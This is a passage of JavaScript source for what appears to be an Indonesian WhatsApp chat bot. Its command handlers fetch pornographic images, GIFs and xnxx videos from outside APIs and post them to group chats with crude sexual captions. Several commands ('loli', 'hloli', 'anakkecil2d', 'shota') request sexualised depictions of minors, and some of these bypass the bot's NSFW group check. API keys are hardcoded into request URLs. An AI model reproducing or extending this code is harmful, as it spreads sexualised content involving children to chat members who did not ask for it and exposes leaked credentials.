Miku.sendMessage(m.chat,{caption : `Bila hasilnya buriq ,berarti belum dibenerin webnya:v`})
}
break


case 'zippyshare': {
	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if (!text) return reply(`linknya?`)
if (!isUrl(args[0]) && !args[0].includes('zippyshare.com')) return reply(`The link is not a zippyshare link`)
reply (`Sek...`)
link = args[0]
ri = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=${lolkey}&url=${link}`)
hasil = await getBuffer(ri.result.dkwnload_url)
Miku.sendMessage(m.chat, { document : hasil , fileName : `${ri.result.file_name}.mp4`, mimetype : `video/mp4`},{quoted : m})
}
break
case 'download':{
if (!isCreator) return reply (`...`)
let link = q.split('|')[0] ? q.split('|')[0] : q
let judul = q.split('|')[1] ? q.split('|')[1] : q
let mime = q.split('|')[2] ? q.split('|')[2] : ''
Miku.sendMessage (m.chat, {document : {url : link},fileName : `${judul}`, mimetype : `${mime}` })
}
break
case 'xnxxsearch': case 'xs' :{
if (!isMod) return reply (mess.mod)
if (!args.join(" ")) return reply (`Anuu 👉👈, Linknya Kak?`)
reply (mess.waiting)
ri = await fetchJson (`https://oni-chan.my.id/api/adults/xnxx/search?query=${args.join(" ")}&apikey=istighfar`)
judul1 = ri.result.result[0].title
link1 = ri.result.result[0].link
const judul2 = ri.result.result[1].title
link2 = ri.result.result[1].link
judul3 = ri.result.result[2].title
const link3 = ri.result.result[2].link
judul4 = ri.result.result[3].title
link4 = ri.result.result[3].link
const judul5 = ri.result.result[4].title
link5 = ri.result.result[4].link
let text =`       「 XNXX Search Engine 」

1. Judul : ${judul1}
   Link  : ${link1}
---------------------------
2. Judul : ${judul2}
   Link  : ${link2}
---------------------------
3. Judul : ${judul3}
   Link  : ${link3}
---------------------------
4. Judul : ${judul4}
   Link  : ${link4}
---------------------------
5. Judul : ${judul5}
   Link  : ${link5}
---------------------------
Note : Jika Ingin mendownload, Silahkeun Ketik *-xnxxdl*
`
let buttonc = [
    {buttonId: `-donasi`, buttonText: {displayText: 'Buat makan kak'}, type: 1}
    ]
	let buttonMessage = {
	document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: docs,
	fileName: `XNXX Search Engine`,
	fileLength: 99999999999999,
	caption : text,
    footer : 'Miuna',
    buttons : buttonc,
    headerType : 4,
	}
	Miku.sendMessage(m.chat, buttonMessage).catch((err) => {
                     reply(`Web Error!`)
                 })
}
break
case 'xnxxdl':{
if (!isMod) return reply (mess.mod)
if (!args[0]) return reply (`Ettoo 👉👈 , Linknya Kak?`)
reply (mess.waiting)
const links = args[0]
ri = await fetchJson(`https://oni-chan.my.id/api/adults/xnxx/download?link=${links}&apikey=istighfar`)
judul = ri.result.result.title
info = ri.result.result.info
const link = ri.result.result.files.high
cover = ri.result.result.files.thumbSlide
let teks = `    Miuna XNXX Downloader
Judul : ${judul}
Info : ${info}`

let buttonMessage={
video :{url : link},
mimetype : "video/mp4",
caption : teks ,
footer : `Miuna`,
headerType : 1
}
Miku.sendMessage(m.chat, buttonMessage ,{quoted : m}).catch((err) => {
                     reply(`Web Error!`)
                 })
}
break

case 'spank':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
spankd = await axios.get(`https://nekos.life/api/v2/img/spank`)                                   
  let spbuff = await getBuffer(spankd.data.url)
let spgif = await GIFBufferToVideoBuffer(spbuff)   
        await Miku.sendMessage(m.chat,{video: spgif, gifPlayback:true},{ quoted:m }).catch(err => {
                    return reply('Error!')
                                    })
break





	case 'gachacosplay' :
	case 'gcosplay' :
	case 'cosplay' :
	case 'cosplayer' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
	 if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.randomnsfw)}`        
 let buttonkontol = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin menyambung hidup!`}, type: 1},
    ]
  let gachatt = {
   image: {url:nye},
   caption:  `Cosplayer Nahida = SSR\n Cosplayer Nahida Bikini mode = UR`,
  buttons: buttonkontol,
  headerType: 1
  }      
            await Miku.sendMessage(m.chat, gachatt, { quoted:m }).catch(err => {
                    return('Error!')
                })
break	

	case 'hmiku' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
		 if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.hmiku)}`        
 let buttonkontolss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolss,
  headerType: 1
  }      
            await Miku.sendMessage(m.chat, gachattss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
		case 'pantat' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    	 if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.pantat)}`        
 let buttonkontolsss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattsss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolsss,
  headerType: 1
  }      
            await Miku.sendMessage(m.chat, gachattsss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
	case 'memew' : case 'manko':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
		 if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.memec)}`        
 let buttonkontolssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolssss,
  headerType: 1
  }      
            await Miku.sendMessage(m.chat, gachattssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break		
case 'oppai' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
		 if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.gachaoppai)}`        
 let buttonkontolsssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattsssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolsssss,
  headerType: 1
  }      
            await Miku.sendMessage(m.chat, gachattsssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break		
case 'hloli' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
	if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.hloli)}`        
 let buttonkontolssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolssssss,
  headerType: 1
  }      
  await sleep(15000)
            await Miku.sendMessage(m.chat, gachattssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break	
case 'ikku' :
    if (isBan) return reply(mess.banned)	 	
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
	 if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.ikku)}`        
 let buttonkontolsssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattsssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolsssssss,
  headerType: 1
  } 
  await sleep(15000)     
            await Miku.sendMessage(m.chat, gachattsssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break				
case 'genshin' : case 'genshinimpact' :
    if (isBan) return reply(mess.banned)	 	
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.genshin)}`        
 let buttonkontolssssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattssssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolssssssss,
  headerType: 1
  } 
  await sleep(15000)     
            await Miku.sendMessage(m.chat, gachattssssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break		
/*case 'yuri' : case 'lesbi' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.yuri)}`        
 let buttonkontolsssssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattsssssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: buttonkontolsssssssss,
  headerType: 1
  }      
            await Miku.sendMessage(m.chat, gachattsssssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break*/
case 'disepongin' : case 'nyepong' :
    if (isBan) return reply(mess.banned)	 		
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
   nye = `${pickRandom(global.nyepong)}`        
 let buttonkontolssssssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattssssssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar ya bang!...`,
  buttons: buttonkontolssssssssss,
  headerType: 1
  } 
  await sleep(15000)     
            await Miku.sendMessage(m.chat, gachattssssssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break		
case 'tusbol' :
    if (isBan) return reply(mess.banned)	 		
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
    reply(mess.waiting)
    nye = `${pickRandom(global.tusbol)}`        
 let buttonkontolsssssssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattsssssssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar ya bang!...`,
  buttons: buttonkontolsssssssssss,
  headerType: 1
  }
  await sleep(15000)      
            await Miku.sendMessage(m.chat, gachattsssssssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break		
	case 'pansu' : case 'pantsu' :
    if (isBan) return reply(mess.banned)	 		
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
    reply(mess.waiting)
    nye = `${pickRandom(global.sempak)}`        
 let buttonkontolssssssssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattssssssssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar ya bang!...`,
  buttons: buttonkontolssssssssssss,
  headerType: 1
  }
  await sleep(15000)      
            await Miku.sendMessage(m.chat, gachattssssssssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break		
case 'colmew' : case 'colmek' :
    if (isBan) return reply(mess.banned)	 		
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
    reply(mess.waiting)
    nye = `${pickRandom(global.colmek)}`        
 let buttonkontolsssssssssssss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu Admin Menyambung Hidup!`}, type: 1},
    ]
  let gachattsssssssssssss = {
   image: {url:nye},
   caption:  `Jangan coli pake gambar ya bang!...`,
  buttons: buttonkontolsssssssssssss,
  headerType: 1
  }   
  await sleep(15000)   
            await Miku.sendMessage(m.chat, gachattsssssssssssss, { quoted:m }).catch(err => {
                    return('Error!')
                })
break		
		
case 'blowjobgif': case 'bj' :
    if (isBan) return reply(mess.banned)	 		
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
bjd = await axios.get(`https://api.waifu.pics/nsfw/blowjob`)         
  let bjf = await getBuffer(bjd.data.url)
let bjif = await GIFBufferToVideoBuffer(bjf)
await sleep(15000)   
        await Miku.sendMessage(m.chat,{video: bjif, gifPlayback:true},{ quoted:m }).catch(err => {
                    return reply('error..')
                                    })
break

	case 'hentaividio' : case 'hentaivid': case 'hentaivideo': {
    if (isBan) return reply(mess.banned)	 		
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
Miku.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Judul : ${result912.title}\nKategori : ${result912.category}\n$Mimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
}
break

case 'trap' :
    if (isBan) return reply(mess.banned)	 		
    if (!AntiNsfw) return reply (mess.nonsfw)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
 let trapbot = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu admin menyambung hidup!`}, type: 1},
    ]
  let button2Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ini dia...`,
  buttons: trapbot,
  headerType: 1
  }
  await sleep(15000)     
            await Miku.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'loli':		
if (isBan) return reply(mess.banned)
if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)		
nye = `${pickRandom(global.loli)}` 
let jembot = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu admin menyambung hidup!`}, type: 1},
    ]
let tkontol = {
   image: {url:nye},
   caption:  `Ini dia...`,
  buttons: jembot,
  headerType: 1
  }
  await sleep(15000)     
Miku.sendMessage(m.chat, tkontol, {quoted:m})
break
	case 'gachawaifu': case 'gwaifu' :		
if (isBan) return reply(mess.banned)
if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)		
nye = `${pickRandom(global.gachawaifu)}` 
let jembots = [
    {buttonId: `-donasi`, buttonText: {displayText: `Bantu admin menyambung hidup!`}, type: 1},
    ]
let tkontols = {
   image: {url:nye},
   caption:  `Ini dia...`,
  buttons: jembots,
  headerType: 1
  }  
  await sleep(15000)   
Miku.sendMessage(m.chat, tkontols, {quoted:m})
break		
		
		
		
		
		
		
               case 'shota':
                case 'anya':
                case 'sagiri':
                case 'miku':
                case 'megumin':
                case 'wallnime':
                
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${command}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Mau Coli Bang?"}, {quoted:m})
break
                case 'chiisaihentai':
                case 'trap':
                case 'yaoi':
                case 'ecchi':
                case 'hentay':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
 		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Silahkeun!"}, {quoted:m})
break
		case 'ketec':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/animearmpits?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Jilat noh ketec"}, {quoted:m})
break
	
		case 'milfu':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/milf?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Milf Saikouu!!!"}, {quoted:m})
break
		case 'eleina':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://revita.herokuapp.com/api/wallpaper/elaina?apikey=ApiRevita`
Miku.sendMessage(from, {image:{url:nye}, caption:"Silahkeun Kak!"}, {quoted:m})
break
		
		case 'kanna':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/kanna?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Lolinya *Ri*"}, {quoted:m})
break
		
		case 'anakkecil2d':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Tiati bang"}, {quoted:m})
break
	
		case 'liwed':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/lewdanimegirls?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"_Colilah meskipun titit anda sudah loyo_!"}, {quoted:m})
break
	
		case 'lycoris':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=lycoris_recoil`
Miku.sendMessage(from, {image:{url:nye}, caption:"Dapet ambatukam = GAY!"}, {quoted:m})
break
		case 'spyxfamily':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=spy_x_family`
Miku.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
break
		
		case 'nun':
		
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
   		if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=nun`
Miku.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
break
		case 'femdom':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    		if (isBanChat) return reply(mess.bangc)
		if (!m.isGroup) return replay(mess.grouponly)
		if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/hentaifemdom?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Kalo dapet yg mangtap ,tag Ri!"}, {quoted:m})
break
		
		case 'crot':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/cum?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
break
		
	case 'abc':
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/yuri?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"ahh Crott!"}, {quoted:m})
break	
	case 'tete':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/tits?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'memec':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/pussy?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'yurimesum':
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/eroyuri?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'holoero':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/holoero?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break	
	case 'nekochan':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Ingfoin kalo dapet yang mangtap"}, {quoted:m})
break		
		
	case 'koelananglohmas':
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/trap?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"_Terdiam melihat kelakuanmu_ "}, {quoted:m})
break	
		
		case 'slurp':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/blowjob?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"_Sepong tros tuh batang_ "}, {quoted:m})
break
		case 'fetishkaki':
		if (!isBotAdmins) return replay(mess.botadmin)
		if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random2/feet?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
break
	
		case 'pantat2d':
	    if (!isMod) return reply(mess.mod)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/animebooty?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"_Jangan jilat layar blokk_ "}, {quoted:m})
break	



		case 'nenengede':
		if (!isCreator) return replay(mess.botowner)
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=${lolkey}`
Miku.sendMessage(from, {image:{url:nye}, caption:"_Sugoi Dekkai_ "}, {quoted:m})
break
case 'glasses':  case 'mstrb':  case'tentacles':{
    if (!m.isGroup) return replay (mess.grouponly)
    if (isBan) return reply(mess.banned)
    if (!AntiNsfw) return reply(mess.nonsfw)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
nye = `https://api.xteam.xyz/randomimage/${command}?APIKEY=70fbbb7a90d2a51a`
let button =[
{buttonId: `-donasi`, buttonText: {displayText: `Sedekah Seikhlasnya!`}, type: 1},
]
let buttonMessage ={
image :{url:nye},
caption :`Anuu...`,
footer : `Miuna Bot`,
headerType : 4,
}
await sleep(15000)
Miku.sendMessage(from, buttonMessage,{quoted:m})
}
break
	case 'meme' :{
	reply (mess.waiting)
	tot = `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`
	let button =[
{buttonId: `-donasi`, buttonText: {displayText: `Sedekah Seikhlasnya!`}, type: 1},
]
let buttonMessage ={
image :{url:tot},
caption :`AwikWok banged 😶`,
footer : `Miuna Bot`,
headerType : 4,
}
await sleep(15000)
Miku.sendMessage(m.chat, buttonMessage,{quoted : fgclink })
	}
	break
	case 'pat' : case 'Patrick':
case 'patricksticker': {
		if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Miku.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break	
			
					
case 'hentai-neko' :
case 'hneko' :
    if (isBan) return reply(mess.banned)	 	
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `-donasi`, buttonText: {displayText: `Sedekah Seikhlasnya!`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Miow-Miow Nii-chan...`,
  buttons: hnekobot,
  headerType: 1
  }  
  await sleep(15000)    
            await Miku.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break

case 'hentai-waifu' :
case 'hwaifu' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `-${command}`, buttonText: {displayText: `>>`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Jangan coli pake gambar bang!...`,
  buttons: nwaifubot,
  headerType: 1
  } 
  await sleep(15000)     
            await Miku.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break

case 'gasm':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!AntiNsfw) return reply(mess.nonsfw)
reply(mess.waiting)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `-gasm`, buttonText: {displayText: `>>`}, type: 1},
        ]
      let buttonsssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here it is...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await Miku.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break  


case 'smug2':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
reply(mess.waiting)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/smug`)
                           var wbuttsss = [
        {buttonId: `-smug2`, buttonText: {displayText: `>>`}, type: 1},
        ]
      let button1ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here it is...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await Miku.sendMessage(m.chat, button1ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break

case 'foxgirl':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)
                           var wbuttsss = [
        {buttonId: `-foxgirl`, buttonText: {displayText: `>>`}, type: 1},
        ]
      let button12ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Awooo...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await Miku.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   

case 'animenom' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)
    waifudd = await axios.get(`https://waifu.pics/api/sfw/nom`)
 let xxhnekobot = [
